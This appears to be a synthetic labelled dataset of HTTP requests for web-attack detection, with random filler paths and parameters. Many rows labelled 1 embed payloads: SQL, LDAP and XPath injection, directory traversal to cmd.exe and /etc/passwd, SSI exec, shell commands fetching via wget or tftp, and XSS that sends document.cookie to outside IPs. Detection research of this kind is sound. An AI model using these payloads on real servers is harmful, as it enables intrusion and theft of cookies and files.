GET,/ev3rWP0/t2louykIooDpods1n/eAdegQPtSdGNfgzN1-S/entTihdsnjn/M1X@servicesLTCbq7c2/-9/iuHAiH-7a.fQo.php,HTTP/1.0,144.64.209.11,0,@VmincludessystemLEMbhE=T%2B&winntBDnx=ewaase1eai&emne0zehlsl2=ftpesntuai6enr&edVgmlnflmrtr=not&aWhoTdhsaeh8Su=2566&k5276ttrebtaye=%40&i6uutoicp=uhin%26%28u%25rcpa&e7dsEunoayugil=A&A5L=arboot.inimd+&6t=+xp_eOr%3Fs%3CrhDecae&tgtrwqtadpmets=ton2Ohfa&pl=5&hp4s0ooersN1ao=wCX5E5Et7R4&asytdupdeYne=ohhghsoue0htql7b
GET,/bnxaSi_TMz7q4u8t/1tSUV-vh9zxRSC/wW2lojk0n0brEsEPXIVF/d_I/ywnaM./enh/lnqjk.T-xmlQR0/sf7ojN5S0GzFa7p/oaDUtvrwN.png,HTTP/1.1,26.238.130.83,1,rAoeez3otai=eT076%401DVskr&sqia=aFo6ONoB&adtbet4=rhuoI%29%28%26%28objectClass+%3D+tuo*%29
GET,/tignscxVQ3OTOOsDR/5nEeeemneeop/qeYuKlHagroup by3ZZ/tashheivelttps/eDoD/cI5BW/4p1LJkqR/9iN@.oJffcO6d.nsf,HTTP/1.0,www.lhdnveqe.be,0,lyavg=zpassthrut+e&ssrsemy7fsqg=63564059&nTtqarAvd5=5059&rrrshp3cie=hrosruc86adnnt
GET,/o4Wk1_Jnv0TNVSKY/d0nloFeoritEqeup/ni/no3g6WN.cgi,HTTP/1.0,www.er5f.biz,0,Ht5e73ens1A6=TjiTEdmaohuaEm&et=nzr&usr9homeiframeAFIYtz=oE2ahnsssoian&6enh2n7=Hbodyei%28ti4ugEr%26e&XzJEclogG=dpj&ztaehna=924&sfTta7rtcint8u=Ilb+etcnplhttpodtiscripthsocsh&tebfonleqkSas=ttsuuueazpeareu&K4jKOP5=ofrom+nc%28connectwal&orivpyMtEj2ote=nlfrxdlossbee&d7eloobtsxidj=tyeouresoAesTtolb&nfreetimAbhon=0494524
GET,/bvBhGgQgtRaU/ag/snfm@g/AkaoI.shtml,HTTP/1.1,www.butsodpad.gov,0,ftox0e=981524&st9hAeAnis=e2pmui6noblo3atun&dal=qks8i&j4tybbsldiaie=7674289189
GET,/agtaea0om/ffG9h47B33/hlu27PmCzEwJ/ogCmiHaS0/05catZZvoQbWiKr/oef/tnUQdy_1.php3,HTTP/1.1,www.a9rdrn.st:850,1,DluG=eAsoraz%27e%3Arot&khaKO7=ed&besoctht=%3C%21--++++%23odbc+++statement++++%3D++++%22select+++seamubmi%2C+++ai%2C++++we2esi+++from++dpO4qahjis++order+by+++++0%2C+++++332%2C++6%22++--%3E
GET,/3GfdnpnCPVqL1_/Wvor9J/ysuORjgxiij31/ou2OErn0ltimsck/rhpyimw/EttHsttaifAhwm/myrtwAravmbtfnsrl/edTneEobnhtI/sdiire1aO4h/bvuI@oTifc-IFCtb/esrpegsms0mu5upaekel.sh,HTTP/1.1,www.ihnno9eeOa.fr,1,ri=Eos&sghwnSsriuseemr=60.128.30.240+++++%7C+++tftp+++++-i+++110.30.63.32+++PUT+sam._&S-k69=0336637&soagieyaatc=frVC-dx&evett2mfessa=h&0xPRHunionvIWXiwget=roem
GET,/n77ethnR5rdn7wrsfe/uwncvd7eth1ye/u2n1nsal/ot9gGwpnad_e_d8wAhe/brRoj1Tz0ZT5-vNea/4x_/o0@ZcL46suz/t8mHPm/hoanpahe3o0Rcaursn/Xc32aapgaMn7ieeds/q8nCselectqs/eGF2QD_mL759hIWDC.jpeg,HTTP/1.0,www.hhhtN.biz,0,eefpSra=4%406RmWgh&f4ojselmtoxuUk=ye&ezvSiqw=i%3FzSidnkm%27&mnbmcot0ru5rhAB=biFnh&IasrNajcnhomt=017&Dhsl=nodehttpr&hdeniarlnj1h=607374&nitsvl=xn%26%5C&vmeLur3Seldht=9017555906&isajc8=rsxW&Fsystemi5Miw=tcyaf&e8OetedenxOl=749&4eeheo=80&eit7ee=tmpl&EaI7.-=t
GET,/6S-/mv5bMuSe6X/qAhQG.LrBZJQPvMZqna/fh3aeS3enFegt/a25eVAIsNn6jQVN6j.jpg,HTTP/1.1,195.122.236.58,1,wihateeiro=%7C+%2Fbin%2Fid
GET,/278-NMnCZdW/n1iat_k8pPXg/nOoSZTK/ncUsBB/zIMIi6metawhereI/VqNg/ealirmixahdSe.asmx,HTTP/1.1,www.at4b.st,0,y1isheg=084452370&tteyRtenmb=t7rwihwt&ngrencite=ndRqi&rdt=miniitss&iaoykase8l4a=803&it=miunode&iUsTaTwsox6EiPs=4pnh&ckN28VWjIviie=%3Bisj&lr=690179
GET,/ikuK8Faaq2QGby8fTp/ldEvmREf/sntri63eldeb5g/1kot2hpsbk7bt8h/7nYsJZ.m/opoKmz/dTYkAnFM8srfVRK/fUkeUPwVLI.png,HTTP/1.0,www.ehrg.st,0,tp7iirntYt=6361666&cQPJz4HY7P=0512&kTryuS=bczCrfimtoJte5e&wlCNssey=+&ayp1ridsi=1+iryoS&z0nslwwn43twtwz=77&pvsXsetheinjrEL=4349128&hovi=oakl6941hcjass&ytn6crft=6ti8vl-&ouikP9berId=sam8dhesA%297atasystemhesm+t&fn2estoir=%5Cg&nsolmliep206=4&xT1XdroplibV=em&n8iei8t=tsNidVe&nr=hKREStq3%40i
GET,/osut4o0sdl/01K/tsrtE8lhitdns/hQoR7NOeV7.php4,HTTP/1.0,www.doithtaje.org,1,.deleteBimgDosf=28590504&xSKP=tRZI-I.v-X4&etiere=n0ca+&tibouzif7si=o&urtceaipdytfT=6UxKlnxXSbv&binwMbAbI9system=2075316&KpsL_wZO=%27++++%2F**%2F+++OR++++%2F**%2F+%27T50st%27++%3E+%27S&ihwfge=922676&eKNjoT7b=30&6ftpFausr3EZ5=50091192&S6vesnldceex=link7zs&md=+aohn
GET,/vvFfV1Q7Yly/rfsDF1sy.mspx,HTTP/1.0,212.151.210.230:418,1,drr=eo2l%5C8yzfta&5nre=27&binspc-itmpbPLz=433388&td=s2iand&reUhlaatezledm0=493941&dEmvoe=tS6th++stdint%25ue&hsme5eMortdwnf=t%3Fin+ocs&errsh4y7n=slQE8KoP&hh=%29++++%28++++%7C++++%28displayName%3Dhad*%29+++%28name+%3Dhad*++++%29%28mail%3Dhad*+++%29&meLebsiotr=58958&rsiirs6zlG=912t+pbChPdupuf&mqatknesvcaohl=90&2pjhmailZ1BB1a8=sSa&btg=st+t&5tO5HAhor=eae
GET,/su9EUlmr2c4eirrebv/4rnehA8n/bINgXuJhomeuw/rRefttKsi0hoh/lclgvml4/ueEs4ooltr/mVc_E72LOB/oIndX208swtsjHi/eVY6EIAcrlBBiw/dG-6tq.tiff,HTTP/1.1,141.212.4.164:80,0,vidzrit=cye&onraedtoeyi=5&i5dmpkRoaens=%25dsbi&fCv4nenn=26139772&iufxrhsesq=ropennds
GET,/iurTt7Saeprod/ome/e_PtIgAv/em_dqSWjlskIs4BIeaA3.css,HTTP/1.1,www.azlw.be,1,a4ehqNiulssfe=t%2Fn%24nv+edMh%3Da3x5i&fP0j51.wI18=iItAZw%40jH8&es5eneu=64990241&nz8onrcp4=4876889&de=42272&31tt2htE=itwt&4U6poetosraoo=tnIservicesobjectu%3Fx3pr%3E6%2Brincludenx&6nnht59=sig&timIeser17e=509&QDv-YfNQ=Cf&3eslRsoebem6tnT=iwce%3Cdmail&tDpNiTdj-=tg%3DtaetcwhereuIPt&rkewnoralr=%3C%21--%23include+++virtual%3D%22c%3A%5Cwinnt%5Csystem.ini%22+++++--%3E
GET,/s55y.wAvjVp10R/nQ/qlym1qeHoooini1soer8/tooV/3sEgie1hl4ntsl/WVhi0z/VbodyRxs7WgC/o.-t8ikmA5HuFYW/lOIuqmPmu7/tt5kiBaY2E5/wa_e0t_.swf,HTTP/1.0,www.mhwvjpods.ch:5229,0,execpKAx9vMxml=hbfen5dcd&gayatsenl=vuerrbfKfveu9aFb&neHus=tunionheOr96t819T&lo=0&tlw7cafstsfatae=oni%27sRNli&sock_streamLzluUXx=58&lNgNewekeeme2=37
GET,/a0g6/iZJr5E8aCzIv/tham4usaeWcr/eVKeJex4vBfjfEbXUv/ieOuhGqUKnFjS5/xrGrVYea.php4,HTTP/1.0,www.eot8sm.org:039,1,dTm=%3Cdiv++++onmouseover+%3D+%22+++%5Bwindow.open%28%27http%3A%2F%2F183.149.3.178%2Fmandas.mspx%27%2Bdocument.cookie%29%3B%5D%22+%3E&TcghheAuis9=93&y3rl5=66139216&waaln=le&rapnsreyeOmf=m&tisshaoiimadRl=xc
GET,/rFkPjJdo/gYH2hhMTHvKKYo/R6jFMPdc/rm0Zqo02Fn@x2QjsSsh5/oeineewopomjnzlf/57LCH/LdetttfP/es7aohgoy4ebhq.asmx,HTTP/1.1,35.12.255.85,1,rihbee5bde=%29%28+%7C+++%28displayName%3Dhad*%29+++%28name+%3D+++had*+%29%28+mail%3Dhad*++%29&szslnDi=iCoaF_&eta=3391647195&urIHhe0tgnexskn=590462865&faratleer9=99
GET,/uv5anousa7go/lte/bDYP-0yZZMleZ6/ts26R3SFliyS.css,HTTP/1.1,179.87.212.200,1,HD1qabMm8=+Os&ocCoRaneas6e6h=S%5Da0&tisiabpreliuc=xxyilu%7C&iornooepsj=aen&PRex_U08o9T=9711&2wQsam@=os&ZvG@x5LZgYJM=%5Cnuftp+-p+++++www.maalrens.com+++%2Fsttiin%2Frilitiisleto%2Ferto%2Fch%2Fns%2Fla&iaeOabdteee=wrAr%3A&t0daOD1t0O=rqiiotleonnaeee9ae&ikfeo=8434638
PUT,/ao81acdiH9N-mu/cf4CL/i8/pKNT./umnn5etthrareylr/o2NF/agsp8yF9/zd_hPOGor8servicesgg/Knull/saiwwieelewoumalt/gdrRx2FdV5Rb8.htm,HTTP/1.0,197.217.85.195,0,6Jyetn4ES=9132187&yehrreiaai5vmiD=ehyhhwnabhmu4Ea&73JFautoexecEgnWwp-=O8&nhiITem=a sDnrcprd&r2epbfmO=t]e7cdTde&iritnszl=n t(cmhtuhtDOr&jeeihRsiwnwcl=te&VErXWLrgzy4=h](5&iygebMMkaeE=3214
GET,/xaner9tpeitaams/nnljboevu/Eohtl/hBI7xzSupc/gcex/w54_oSYhMwNEIXrmSe@E/dzML4MAx/aartlbmoghjotelrms/f82i/EVhKX090insert7U/aY@em7ECw2xeMKNMBq8z.htm,HTTP/1.1,www.Tdtdnph0.ch,0,degSrd=dsock_stream+replacet&divKhttpsz=Ispsynaw%2FPimg&c2c=31528726&fepesghfeg=nHcservicesgina+Bt0aisscriptu&paAieina0t=8tmRafh&sr=06981850&mochaacnSoptEF=e%28u3&Nihl3t6eI=03134&hE9etfNo2rssu=+5eainclude0mI7eO&kt=autoexec%22%2B8cnh+%22oa6mmr&hxan=hWhiOrlj8iapgtA&uana=%24aa&nsijwNsk7nWbtsf=dhhCl&uw3rhgdg=elloadoN0rnfnofo&nH3Pb=isstdinmled
GET,/eC/etS/wqtTL84TW/rQDf1wvdHhPtzI/lWa-p_/Cdtnj/alroe8z83rSp/t4HPyyUwpoUFcV/Sr5D.jsp,HTTP/1.0,86.73.71.222,0,Ttww=%3Erb8Tt%3Fe++%3D%28bgsound%3A&Op=Ieh%3Ad&xbWi4_CKc=tcnfo&temoanmToott=6&WMuieoejctlqinr=93281&udY5ZHaDJlC=434&enEa3xruuene=fmeta9
GET,/f3/aRe9cmte5iwrhsEH/osdqhlktb6siu.cgi,HTTP/1.1,www.eale0.org,0,euoi1ndnulqt=202&xoiyhtunsEdlst=dasbodyPhqi+ry+piN%27+%5Bo&lexii=oyl%7C1%3Bha5&yyfje5tnllG=1El&form3p6cI=tcneegeaei2i&dycfaalHi=603219566&attjeih=sVvN6Zf&ewbNtyeeD4neuos=8&altwelydshns=13254577&h1m=4340237&tfnkOhyltcne=e9PRtfVX4tAM&qcWTpiq=aH.&nhdetlqcelu=b4enSrdvizse&pHhweo9a=24693&ssjdbeyn5asrar=xNs%29eivtmetaift
PUT,/gEawu/dTnASb4D/frhg/eJb1POcGH/hLysa/Vp6QH7fF7Vp/_V1V6V3FEa/PPXphpEnicYgrL/dlns4taptegsyeptiL/eY.E.js,HTTP/1.0,233.4.138.214,1,htacceszLopenbautoexec=ottihmsaxnftpke&s2rnrfi=tQPs0E1l&0dictmpwsuGo3=nyBU3V&oAVQworjN3F1m=pr8stdinemnlc(e&wtSgshhox8d=sC0MmyE&4gseamStnEa=whlkktiootE18pmZl&7.XB0Hu5=etcub9acopyaiobject|]&err=7&uafSHdh=111.85.138.203|    cmd.exe:/s&ssfmey=ow.9dK7B4UU&Ach5wf=joOehrnEnRi&koxlecAT5cdntoW=Eh&oot3lthosNn=edutc
PUT,/qNbVf7jJsFJIuyZb/xTKh_/UF86-script_Ui.htm,HTTP/1.1,www.tehls.be,0,dndsayuNahe=paihuAelh&trapeeptnr=r8uy&nse8=iEw&eelNeymntunitmt=00764&zx419wDm=wt&aibE1Fual=oT77F_eNmTe&5oC2orodoi=ilikeb>ieandhzmeIhn0&aetesusse=<iyTtn[tp&nrih=nn aiIhe6Thd&In6w6=wkKfROJQNx&JjoptBxbI72N=h_SD&raa6sootsltm=oMnu8&ten4=ubMM
GET,/H1h/ez/1tawlye/71ooigieqdw6/ro1hc1nyanitrott/eese8iesnbvlshRLE/utvctod6orrypTefnte.png,HTTP/1.1,198.48.113.69,0,al1ffhemnh=%3Bta7H&rharnumih=aYCqh1CM8IK0
GET,/Ae3aucei/eI74rdS6x3lBCa/e@N8tiO_.NogJQW8fTt.cgi,HTTP/1.1,68.102.103.176,1,aedljtosits=necho&AdT=%7Csneo%7ErwOhz3%3D6m&eWh=57&etEsoiahdmbe=t55r&d6osdaeeeaAo=%3Cimg+src++%3D++++%22++livescript%3A%5Bwindow.open%28%27http%3A%2F%2F115.64.163.145%2Fchlaie.swf%27%2Bdocument.cookie%29%3B%5D++++++++++%22%3E&xmlU6sSFKWL=38213&Pstwes2nit1itbd=dOtn%2Bij7Icc&TJFcC5Np3DTR=4&c0n1Imep=7280084001&T9dswas=724249&nhhunNeN=3Xq&9cnhzen=ltnyeuac4fn&Rgte=h1ANHTw8EC4r&cerizTiqu1dc=euSncjdnnmbwett
GET,/nprB/iiu/lqwleolgicd/mprgohi8gfNhwoei1ba/oCx5scriptIwIhiJf.php3,HTTP/1.1,www.1w6par4.ch,0,rin=%24rtorc&rhasbtrPe4=rj.UDYJUGq&ns7Xwr=5265&ueseis9tea=qvdtr%3Aet&cIxO8msl4=948180&7hhe8Stx=b5r%3DandoOE&0netcatVR26Wvn2union=29&9a9bxteheKr=a5fwsneg0I&Nevalhtpassni@hHQ=2227344&ehffitnEcoe=teaeeTmilq&tjiydnysrng5pq=jUQDGv&m3eltA=3431497
GET,/ttsHny/4yHiQF-ZqbV.nsf,HTTP/1.1,214.18.55.44,1,gAydeletek=ntfaa3%27+or+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++or+++%27doretocs%27+%3D++%27
GET,/rcex2uste/t2td5ltdal/aN92e2ayj.js,HTTP/1.1,103.12.205.213,0,esLhom6afns8=20&1gi=5230&oehetcev=eCP-&dta=ivirt2dlttomfhh&5ynIinG1=4
PUT,/gFuKx_nltHGjq55/cuuhe2htr1bihut/net7aHinaes/i7bs-ZCandison/2mibe1fotUune/lyLl3AGOG7UP2n/eB7P.zGbu-ahLAVKQG.aspx,HTTP/1.1,68.213.164.121,0,3S5logqS5kI=ctsi&loea=s3e
GET,/diw8azehctomium3/9C/atSlD.3N.Hb61G_W/azltau/CWCz/oyoe6dieoe/Sd5atfznlhptaxnepr/eheuteljore/ufonniut3raoB/tWZ/GrtsCuNesgsesmosqtk/eoGloeyacsoEsfwny.html,HTTP/1.0,65.112.73.204,1,Nrozsdj=4848%29%28%26%28objectClass%3Dt1t%29%28%7C%28sn++%3D+l9%29%28cn%3Damp5+++J*%29%29&noss6omisn=hantF&PhDTautoexecYimgNrR0W=216
GET,/tewlarjc3iounnOres/ixOeKshfUo.Jx/i2ZcTLDTN4p@a-w7h.dll,HTTP/1.0,234.110.76.68,0,yrdd6iIhtanwlsn=ioAmail&ckn2rtfiaQh=ywcg%27%25uHecho2oamRi&KuLFwc9O7execCX=74949&etEt=79904719&YBWZMC8O@=0314&et7eise=2250&9includeNBZAW=ehsho
GET,/aPlrSkmC/pMi3_HXHVm80IU/acLP8.tiff,HTTP/1.1,110.242.94.108,0,otote2keauawtSo=z%26+8e&UDXBcD_0do=aewnulleet%3Feeaeepgmaa&soqjitnp5=irwtiefnvncca&oe5ueadA=6mgnrontiajhod+o8&sipna=3o
GET,/fHNH_WBFlKe_OjJ.cgi,HTTP/1.0,36.37.22.153,1,mem=es4&woiateos=4&t9v=42981&nhtsut=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&hq=1200&keebadrok4=5thRInNstsInHykc&wrl2d7onDNoo=ioyn&tiezne2eiiltq=39547&aeee=3060
GET,/zG4Kdu2y/hRBO5z3F_husCf/hheeoa/3copyyuJYbgsound/hlX/sY6Fl8P6wak/gI.nsf,HTTP/1.1,22.152.120.108,0,ZvjYEQedz=null&ctoero=necVv8&ttesicitlIrdlf=177762&tezrifdao=3801&EhFesteedot=RiehcfTasay&NugL=7&8twooesS7ct=uand%25rm3&r4Egsouewo=bDservicesx+1ds9SdocumentaI%40%2Fit%5D&thoetairrNsbe=5jxqo&icladfq=0r6%3E&5dnustYtshf=27123&eheehbHRt=dzs
GET,/oL/64Xa/vMW.M5MshutdownuTf4/z6QWiTs9lLrM/aZIs99FncjyO1n/ronxph4mJ/JbNetcS91.bin,HTTP/1.1,108.189.104.98,0,tuyxsjctdfm3v9=mr%25utosdu%28+e%3Csf%5Cla&sGeterps1eha=yG%5Dtee%3Daccess_logadf1g&regs=18152&qoSmes=ehatFsy-
POST,/qynj/edZaJ/e2gK4hgteis/t7iDgdhaTks2kona/Ssi/omNssY/mqI4qEureibipShtld/Mtaera3ee6egn/aETKsKQVLps6Jhm_jGB3/XDMGeoZG.i-vEQ8.cgi,HTTP/1.0,49.146.80.204,1,eSlNhe=itfp)( |    (hots=*)&kc8oiuaokC0n=7893&Ttrator=574341&ttoLuo1a8ioss=hvtce&Sg3cmaxpnleeen=47215539
GET,/ainSlCneiOdtO/4likeexec.gif,HTTP/1.1,www.0loLu.org:27,1,eylners=50964274&taosoe6Ch1hrh=mSmlogrI%2Flt+&rcpUpFw-psDNREs=optiYinph-oetcS%3Ephp%5Bysunion+&aleosaehdya=zPK1wx4&jFgto2Snse=citu%3Ctpte4&Mdissei2o6Us=bnioob&MUcg1JE=OR++40295%3D40295&bc=vbscriptttgre%3FsuH%261mprocessing-instructionidhe5&5iiNfdT=%5CfoHrecopssg&numlHnetpjbugsi=00
GET,/aaGa3/sIon/._catHKEV/esrtaosye792rod/hfforjP.QYZ4/hhteozreiddrD5ba/Q@gformTq9/lAEaeietnoeineN.htm,HTTP/1.1,www.dadgsclt.st,1,1oy=c%3F%3A5se&c9L=8800&4gVtmpXbody8q3@=oQV7&i8epwc=%25t&NX1A=%5Bnygnaservicesre5
GET,/u.vd8MdocumentnA1/rS_sIDtu8Qzek/s-@P8v/rnwlbtthorryv9wy/tGMqLSES5L@V/3XKUATeval3rWC_0w/5y_j9likeZd6GQ.css,HTTP/1.0,www.rmeteoT.fr,1,sI4konnase=hwIc&wthuh=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&ilhahaR8=1520408259&euiz=9668&olU=jt4hoims&yceE=E
GET,/itos6retinnorttm/kZQkX/VincludeqOl/bd.swf,HTTP/1.0,145.255.59.101,1,nMrr4=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fyo.bat&aanasuednP6dEe=jee&ZGG5jX=epdln
GET,/_vti_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe,HTTP/1.0,245.10.140.129:80,1,/c+dir
GET,/e7a0nW7muVfp7l3-xKT/5L2p.php3,HTTP/1.1,www.oislipS.cz:2,0,at=aEreri&eon6linwr6=optn%3Ea%5B&sihnetcduts5e4=754&tHirsoitDjtaide=zkQkCged&ZpXeTRXsbinuwE=i0e2eAkeels7&ud=8lx-1omx6Vd&7tpet6yejhd6io=9lrkJ36welqnta&53idq7htentbkt=2&tc=nhbNtsla&AlRlisbyurjOhtt=8307&erOaftezer=srDrq1%3C2rautoexec%3Eo
GET,/aptPrRRttn5pA/processing-instructionK4fGecXIMR_H/nfiBll/fWI6O1U5Sq.eSsU4k7/aeoie3aehbut/eobof7s90dugtet/-wAlgAoptM.9yjM1/pRRNiOs0ib/a9UYHf/h4BlNwb-Bur0Oe34pgJh/qw8SRLD4Bu8S.Vp/txNP7@7.msf,HTTP/1.0,160.112.201.237:8,0,ufgainl=rizr1.u&0Iewed=FOepn4rr&a0i=0shD8&niml=%5Dincludea-&ec=kobnpasswda
GET,/ana6hgegsNpsgct8m/xmlrwvvP71/GxODT2dls/4pxQfqoIw-BcadPh6vB.gif,HTTP/1.0,www.araHneTo.it:80,1,ntVm=a0dnn%5CselectS%3Ftn3cat-es&FooQG8J=g9n&1WcxSHco=eKYKm&ynpex=%27UNIONALLSELECTfieldFROMtrtaWHERE%27%27+%3D+%27&wtLiE4n0xrhhits=551767&yngFhedIpoprssM=653491155&srne2Nnijrt=+she&E6r=76976274&oXsg5t8dd=1511&gstdinwdlocation.Q02LH=50848&tmaaanevoeii=4650615416&soHpgs=71376947&C54t9elwtepsn=hkmo+denull+set%2BhimlTmo&roe=41036
GET,/ot83ww2nA6bvuI.2bi/s@LBEzLo.jesZ6lHco/nqeam/ht@ql0v9WXYwgP/htMth31indsrts/AexecsBXopenopenIX96/sGJFlXtGdQK5_vz/uedeigcptmdeex/nH9/uhgK3EL-n_Qjh9Z2A6tj/epf0Pbl6C.bin,HTTP/1.0,www.ndSEaof.be,1,nzrdt=%22++++%3B+%2Fusr%2Fbin%2Fwget+++++www.itieal.com%2Fmans+++%3B&iV.Qh1sXW=hr%2Bso&obeeths6iv1htnt=aD%25to&skxmlg1I0@xgl=%29ee&iitdeRhde9etErj=mnrSisolmnrctE7Tzk&ubmnc75Nposition=d20WN
GET,/-C8Pmco-n/grAtr/giTEnNNaGj.7lQvOiLkG/5delete/gdUd2/nS_tPrCU/Opa4rxCueGmEaneuak/tYo61JHoopenwgetTxetc/i3Sheeahncreztdhd/AAArWp1PqQ8X/bibEclg97c2AAnTepg/bhueLtthneess.png,HTTP/1.0,www.blehy.uk,0,d4rp=ss&amKeR1rloyiraes=tqprFizQKUjx&evgrvt=oAzC&MexecjAMUcN=t_xswx&yret6Tdan=oha0cejeanNseaos&Mchvummteoio=7-rcpeR&ibtmi=038694&xoe=1&ctadnhwtsn=176319396&sEr3b=easgittwitdEntlhse&Pu3ccatD_=slnleAf%5Co&nne=inputoct8s8input&ne8aIaaen=%24cTt&sSdqtenem=iEyuo5Gb
GET,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe,HTTP/1.1,www.vloldnms.org,1,/c+dir
PUT,/hbldit4nh6Era/ssboxetitinnn6aqdtJ/s61enttPteh/nnw5iy9ettmt/eA-@O.dll,HTTP/1.1,www.rnrldtrtU.cz,0,st0nvDNubrese5=ro3ca/\\3&gi8@xY=4nqeihote5&haoh3otnEmegN=oxcddn7enieew3&0xformE-qNoLyH=e7 &lv=inputwvfeestdiniee6
GET,/1xDCWXSrftsd/lxq7-S4JT-2lLqEj0JNZ/wso/iooieuwa/kjx4vi.iaLt7ckpEs7@9.mdb,HTTP/1.0,46.130.100.203,1,t9=ee2s&rq6tteptm5dS=2&rdaTNubstopIi=ce2rr&dxsjesu9Y57a=8213&Nidtiimttesw=%27+union++++select+++++%40%40version%2C1%2C1%2C1--&tahne6kToi=89738&Ijonl=u%40wp-dneo%3DnEqx&smddij=mtnf%27IOeh%3Dy
PUT,/v0e_/i4tQxPhYK/iE.php,HTTP/1.0,www.tceeT11.it,1,dw=e t2weenidi&OtoKeTsoe2qee=nhl84&nhu45=rIe6yedi6enhk&FbinsertG1ftppYM=6 id%netcatre&bRunullgL.e2DMx=a&odqnarncst=e4cerrotys&thelerne=('><Tneetupdatee&hdrRhti3ottcer=4oo5w&ieiaamAaGtzttva=03297
PUT,/roSfneIHataer9d/s0eoc/evDP4Ma49TgemS/sE/xeemezeRidcnlhlsrt4R/eooeha6tm/dcC2i8b0V/ihlg9mbnf7kOuipfxx/dt2bNydaaeturihm/rz5oa58AmsazNGONHyE.swf,HTTP/1.1,www.8jdutr063.it,0,uoerons1ttE=$nnc)&a9s1oh=agWMchn&y.zza=narAtselanneo
GET,/ttWHPRfIUZ/o4BFPL85zpb/rthinn/fivheeeaeeBdarr5t.jpeg,HTTP/1.0,www.gathNrrr7.org,1,r9ct=3342&5acncnnbtado=mGp5Rbr&Y3h5erv=1404++or+count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+or+++++9882%3D&hrIhm1=copyneSieb%2FY&a9bpMqii=n2f7ZmXRk6Jv&rzsdsnNo=2608&4WcopyzN2kHT=6&thtmlbAelcrg=9
POST,/kcF4hn9bj/qaacrpnrdnd0aA/eHsI4HysUsI_2rqfpBE/AvjUdocument2ChttpJV6usrNZ/yPf0fcDwA2Mq.msf,HTTP/1.1,www.eraai5.ch,1,sNcerclejcnphr=g o&tmidryv=Pefdrwhtlrtpg&o8neait2=n]eupor&Jgz1a=totuusrhereener &e0bgroaHnslee=386&sLylatAkfE=oNnCnCwphhaK&Fd0okNr=13
GET,/yi1piz@8T/aYRfQZv4Q6/tbhaihbkdfbht/bzy4hSe6jptvh2a5/tan3wVnele/yfc93fK/tres.exe,HTTP/1.0,66.69.65.200,1,sujiesesreeiar=tQz-IfTg&ur=Dht&hwmqh=%3C%21++++%23%3C%21--+++++%23exec+++++cmd%3D%22id%22--%3E&pasceFrhltwotF=winntda&eenmsesTEeao2=a6teh0yi&oxxHaouere=+Br&NIkCaL3CEq-9=ologeQ&WVge=yo%3Do2
GET,/Twrerr/t9nO0HtGM/ncmyaad4aGue/xJ4childZcOS.css,HTTP/1.0,129.99.251.116,1,Baccess_log3clJpD-C@=eEC6C2H&Vtmboot.ini=2458%29%28%26%28objectClass%3Dsmox%29%28%7C%28sn++%3Ddsw%29%28cn%3DMcm+++++J*%29%29&edcUEcz=EdF&AMGYp-c7=475&1H4u8delete2kk=90456
GET,/hfTAQ/hmEpSRMbj0qibj/8d1st0lo/rRv2j7WuotBU-7Sr.tiff,HTTP/1.0,www.bIDeo3tecE.com,1,htTt4=5cmChT-c&s_scriptq8VNNok@=T&4la1MauEhsb=m%5CJjtnlpaecloe&PeYZhATyNIB=caeotexool%26t%5Dhcdoy&uchuesrtinabteg=2&v4c=hqd&oqvvi=apia&aunuot78cGhmCW=T%3E&nlEd=%5B7gc&desPHbhphletmee=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&nerietihl1sq=yc&LEageioeot=inL2eQxh&ss6it4hSNymdh8=hd%3F&bKmeedewr=rrE%28a+s%29aj%29t&uh7emd0An0=33
GET,/a0Dgb/V1AM8.includeexecD01M.php4,HTTP/1.0,www.o4mAi4st.com,1,nshh3rcemoo=e&eeaoOemaa7=segsjIsclte&etuas=045&T9httpsOs7.JwNQ=tlumAmne&wPG.75R=+uog9&v3_X25PaOMh=tozy2n3ekpldle2o&setsaadpHhi=8117745&.J7bUchildOSOLselect=oK_Mc5&qz6CQu=ntAs&eatt7eQsp=aslin+4s&Wyt=109&itghnEnpt9l8yod=etropt%3Celikemobg9&usy=dqigRn%3Der&al=uoa1%2FsT+replaceydn&edsi8s0we=92835
PUT,/ytt/tSw_D0P/750epUvOpP.KOqi8PVvu/CzhuYJZjhFy/yS4mGAL5u-7Z.IoaXhH/iHmttH3VSCmjhKGlX/dyVv4aiWq.cgi,HTTP/1.0,207.164.168.116,0,iobuoeqf21kir=O3wrhi jet-fz&T8rmeipgin=w_LVsra9&dhjesiI=aailrme&8ia=318181&4iazgs=gnt&ZXscriptjI9c= &6anpphnSerleqr=8272&paeshEmb=rftcphp&saudi9ith=79re5q&inygtno0anl=aysnlogsaccept~aroe&FzTP5R=7435&iHdegig=06&nsigneure=e9g5yof'auladmin&h8omfziydnEgE4=yeihzturxazl
POST,/aig/2zrgDqjPcelor/5ar/rimh/VytqwselectN/lQd2DAum5am/IHgO2etcilinkexecNOx0I/t7nctedlhaiTIod/biescybyseeliaM/nyeHoa.cfm,HTTP/1.0,147.16.234.27,1,eu8haoarwnssrmr=OR  'shr'     IN (    '    '  )&0L.arnq-=fco3&oagohdiaorcoSte=t50ZAeim&UPcatqNZsVupdatedEV=pmspe(Alaittwindow.open&eierylthtwmhmm=omiotelnet&6m7gl=61
PUT,/em9S7d/mttlhpweSrl9Ggrr/rhtaccesPC01FOhtaccese4vbscriptTy/iLRD7/srnaSsroqa/ltg@@iQ-/sonzplmbbconv/x-88byg-khzjOKTggU/aUtuEinwckth7tl3.css,HTTP/1.1,www.ejggdroarn.org,1,pd=70542222&Scbmtpom=3599325&bh=htin&wu0oheTeon8slaE=srp&oi4ni=;%0 &uth=D$io&ghm=indsUsubt&mhtr=lxcint&o7WLlQdwjV=t6VSP@JQ&Itstbonetnece=3155512&pK..4xp_XV=stdineut&N1i4hgpnretsM=76698
